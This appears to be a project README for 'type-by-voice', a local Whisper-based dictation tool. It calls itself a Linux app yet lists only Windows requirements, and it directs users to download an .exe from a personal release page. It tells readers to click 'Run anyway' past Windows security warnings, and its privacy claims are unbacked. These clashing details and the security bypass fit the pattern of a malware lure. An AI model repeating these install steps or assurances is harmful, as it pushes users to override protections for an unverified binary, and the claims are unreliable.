---
layout: "default"
title: "🎙️ type-by-voice - Speak to type in any application"
description: "Transcribe speech to text in any Linux application using local, GPU-accelerated Whisper models. No cloud or API keys required."
---
# 🎙️ type-by-voice - Speak to type in any application

[![Download from GitHub](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/tatec756/type-by-voice/releases)

This software converts your voice into text and types it into any open window on your computer. It runs entirely on your machine. You do not need an internet connection, and you do not need to pay for any cloud services or API keys.

## ⚙️ Requirements

Your computer needs a few things to run this accurately and quickly.

*   **Operating System:** Windows 10 or Windows 11.
*   **Hardware:** An NVIDIA graphics card. A card with at least 4GB of video memory provides the best performance.
*   **Microphone:** A stable microphone connected to your computer.
*   **Drivers:** Please ensure your NVIDIA graphics drivers are up to date.

## 📥 How to Install

Follow these steps to set up the software on your computer.

1. Go to the [official release page](https://github.com/tatec756/type-by-voice/releases).
2. Look for the most recent version at the top of the list.
3. Find the file ending in `.exe` under the Assets section.
4. Click the file name to download it to your computer.
5. Move the downloaded file to a folder where you want it to stay.
6. Double-click the file to start the installation process.
7. Follow the prompts on the screen to finish the setup.

If Windows shows a security warning, click "More info" and then "Run anyway" to continue. This occurs because the software is open-source and comes directly from this repository rather than an app store.

## 🎤 How to Use

The application works by listening to your voice only when you hold down a specific key. This keeps your privacy intact because the software ignores background noise until you press that button.

1. Open the application.
2. Select your microphone from the settings menu.
3. Choose your preferred language.
4. Click the "Apply" button to save your changes.
5. Open any program where you want to type text, such as a notepad, browser, or message app.
6. Press and hold your push-to-talk key.
7. Speak clearly into your microphone while holding the key.
8. Release the key when you finish your sentence.
9. The software processes your speech and pastes the text directly into your active window.

## 🔧 Fine Tuning

Some settings help you get more accurate results. You can adjust these in the settings menu.

*   **Model Selection:** You can choose between different model sizes. A smaller model reacts faster, while a larger model understands more complex words and accents. 
*   **Input Gain:** If the software does not hear you, increase the input gain. This makes your microphone signal louder before the software processes it.
*   **Push-to-Talk Key:** You can change the key used for recording in the settings panel. Choose a key that feels comfortable to hold while you speak.

## ❓ Common Questions

**Does this software store my voice?**
No. Everything happens on your local drive and disappears once the software finishes the transcription. Nothing leaves your computer.

**Why does the software use my graphics card?**
The software uses the power of your graphics card to speed up the translation of voice into text. This ensures the output appears almost instantly as you speak.

**What languages perform well?**
The software supports many languages, including English and Japanese. It performs best when you speak clearly and at a steady pace.

**Do I need an internet connection?**
You do not need an internet connection to use the software. You only need a connection to download the initial installer. Once installed, the application functions entirely offline.

## 🛡️ Privacy Policy

Your privacy matters. This tool respects your data. It does not communicate with external servers. It does not track your keystrokes or record your habits. Every piece of voice data stays in the temporary memory of your computer during transcription and gets deleted afterward.

## 🛠️ Troubleshooting

If you encounter issues, check these common fixes first.

*   **No text appears:** Check if your microphone is correctly plugged in and selected in the application settings.
*   **The application closes on startup:** Ensure your NVIDIA graphics card drivers are current. You can update these via the NVIDIA GeForce Experience or Manufacturer website.
*   **Text comes out garbled:** Ensure you are in a quiet environment. Background noise causes the software to struggle with word recognition.
*   **Performance is slow:** Close other applications that use your graphics card, such as heavy video games or 3D rendering apps, while using this tool.

If the application still fails to start, verify that you have enough disk space on your primary drive. The software requires a small amount of space to load the language recognition models.